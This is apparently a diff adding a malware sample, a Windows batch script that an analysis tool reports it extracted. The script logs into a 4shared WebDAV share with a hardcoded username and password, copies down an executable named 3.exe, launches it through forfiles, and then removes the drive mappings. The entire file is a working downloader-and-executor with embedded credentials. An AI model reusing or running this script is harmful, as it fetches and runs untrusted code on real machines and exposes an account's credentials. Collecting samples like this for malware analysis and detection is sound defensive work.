@@ -1,0 +1,5 @@
+REM Batch extracted by Assemblyline
+net use Q: https://webdav.4shared.com dE}9tBDaFK'Yuv /user:lasex69621@cohodl.com
+type \\webdav.4shared.com@SSL\aa\3.exe > 3.exe
+forfiles /p c:\windows\system32 /m notepad.exe /c /3.exe
+net use * /d /y
